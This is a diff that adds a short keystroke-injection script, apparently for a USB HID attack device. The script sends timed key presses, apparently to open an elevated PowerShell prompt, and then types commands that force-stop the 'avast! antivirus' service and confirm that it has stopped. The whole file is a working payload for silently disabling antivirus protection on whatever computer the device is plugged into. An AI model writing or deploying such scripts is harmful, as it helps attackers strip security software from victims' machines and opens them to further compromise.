@@ -1,0 +1,13 @@
+CustomDelay: 300
+Press: 131 + 115
+CustomDelay: 300
+PrintLine: powershell
+CustomDelay: 500
+Press: 128 + 129 + 176
+Press: 130 + 121
+CustomDelay: 500
+PrintLine: get-service
+CustomDelay: 750
+PrintLine: stop-service -force "avast! antivirus"
+CustomDelay: 500
+PrintLine: get-service "avast! antivirus"
